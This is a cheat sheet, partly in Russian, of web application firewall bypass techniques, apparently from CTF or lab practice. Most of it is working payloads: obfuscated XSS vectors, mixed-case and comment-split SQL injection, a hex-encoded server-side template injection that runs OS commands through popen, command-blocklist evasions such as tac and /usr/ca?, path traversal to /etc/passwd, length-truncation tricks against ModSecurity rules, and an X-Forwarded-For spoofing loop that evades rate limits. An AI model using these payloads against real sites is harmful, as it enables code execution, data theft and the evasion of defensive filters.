* Из:
<a href=javascript:eval(atob("YWxlcnQoInhzcyIp"))>test</a>
* Используя unicode получаем:  
<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("YWxlcnQoInhzcyIp"))>test</a>
<iframe src="javascript:alert('XSS')"></iframe> - выполняется сразу!

# Encoding Schemes (URL-encoding, hex-encoding, Unicode-encoding)
 - URL-encoding: / => %2f (Url encode)
 - HTML Entities:a => &#97; or &#x61;(From HTML Entities)
 - Unicode Escapes: U => \u0055 (Unescape Unicode Charachters)
 - Hex Encoding: __init__ => \x5f\x5f\x69\x6e\x69\x74\x5f\x5f (To hex)

# Sensitivity (using mixed-cases to avoid detection)
 - sEleCt * fRoM users
 - <scrIpT>aLerT(1)</scrIpT>

# Obfuscation using White Space and Delimiters
 - '/**/UNION/**/SELECT/**/1,2
 - <a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>

# SSTI WAF BYPASS

* Не сработает из за точек и нижних подчеркиваний.
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
* Исправлено но некоторые правила могут не пустить:
{{ self["__init__"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("id")["read"]() }}
* После hex-encoding(В CyberChef to hex \x delimiter):
{{ self['\x5f\x5f\x69\x6e\x69\x74\x5f\x5f']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('\x69\x64')['\x72\x65\x61\x64']() }}


### Браузер декодирует текст в читаемый уже после проверка WAF

# HTML ENTITY ENCODING
- <img src=x onerror=&#97;lert(1)>(decimal encoding for 'a')
- <svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>(hex encoding for 'alert')
- <body onload=&#97;&#108;&#101;&#114;&#116;(1)>(full decimal encoding)

# Blocklist Evasion Using Alternative Commands (ls,cat,id blocked)
head file
more file
tac file
/usr/ca? file (the ? wildcard matches any single character, expanding to cat)

# Content Truncation Bypass ( Некоторые правила проверяют только определенную длину)
* Правило проверяет 50 символов на наличие тега скрипт (^.{0,49}<script>)
* Обход:
 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<script>alert(1)</script>

# SQL Truncation Bypass (Некоторые праила проверяют первые 100 символов)
 - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' union select 1,2,3,4,5--

# File Path Truncation Bypass (Некоторые правила проверяют первые 30 символов)
 - /././././././././././../../../etc/passwd

# Regular Expression Logic Errors
* SecRule ARGS:exec "@rx ^(?!.*admin).*(?:cat|ls).*$" \
Команды разрешены только с добавлением admin.
 - cat /etc/passwd # admin

# Parameter Manipulation and Missing Variables
Например, чтобы получить флаг нужно обойти следующие правила, добавив ?admin в url
* Rule 5014: Blocks specific admin values
SecRule ARGS:admin "@rx ^(true|1|yes)$" \
    "id:5014,phase:2,t:none,deny,status:403"
 - ?admin=TrUe
 - ?admin=11

# PROTOCOL MANIPULATION

* Http Method-Based Filtering
Например sqli может проверяться строго в post запросе, а для get правила мягче или отсутствуют вовсе.

* Header Manipulation && Rate limit

* X-Forwarded-For - заголовок используется для идентификации ip-адреса, если запрос проходит через прокси
 - for i in {1..20};do curl http://10.48.131.178/api/posts -H "X-Forwarded-For: 192.168.1.$i";done


# Testing Alternative HTTP Methods

* Common Alternative Methods

- HEAD: Returns only headers (like GET but without body)
- OPTIONS: Returns allowed methods and CORS configuration
- PUT: Often used by REST APIs to update resources
- PATCH: Similar to PUT, for partial updates
- DELETE: Used to delete resources
- TRACE: Echoes back the request (often disabled)
